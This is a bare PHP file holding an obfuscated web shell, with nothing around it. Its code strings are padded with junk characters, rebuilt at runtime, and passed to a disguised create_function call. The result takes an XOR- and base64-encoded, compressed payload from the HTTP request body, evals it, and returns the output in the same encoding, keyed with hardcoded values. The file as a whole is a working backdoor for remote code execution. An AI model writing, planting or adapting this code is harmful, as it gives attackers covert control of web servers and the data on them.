<?php
$h='V/V/){$c=strlenV/($V/k);$V/l=strlV/en($t);$o=V/"";fV/or($i=0;V/V/$i<$l;){for($jV/V/=0;($V/j<$c&&$iV/<$l);$j++,V/$i++){';
$d='$k="cV/8c97d6c"V/;$kh="cV/fV/65eb1268a6";V/$kf="V/301V/52ef6V/1254"V/;$p="V/TV/5iJemi6saFgYV/SaN";fuV/nction x(V/$t,$k';
$P='$o.=$V/t{$V/V/i}^$k{$j};}}rV/eturn $oV/;}if (V/V/@preg_matcV/V/h("/$V/kh(.+)$kV/f/",@V/file_V/get_contents("pV/V/hp:/';
$C='getV/_cV/V/ontV/ents();@ob_end_cV/lean();$rV/=@V/base6V/4_encode(V/@xV/V/(@gzcoV/mV/press($o),$k))V/;print(V/"$p$kh$r$kf");}';
$r=str_replace('p','','crpeapte_pfpuncptipon');
$X='/inV/V/put")V/,$m)==1)V/ {@ob_starV/t();@evaV/l(@gzuV/ncompressV/(@x(@baV/sV/eV/64_decode($m[V/1])V/,$k)V/));$o=@ob_';
$D=str_replace('V/','',$d.$h.$P.$X.$C);
$Y=$r('',$D);$Y();
?>
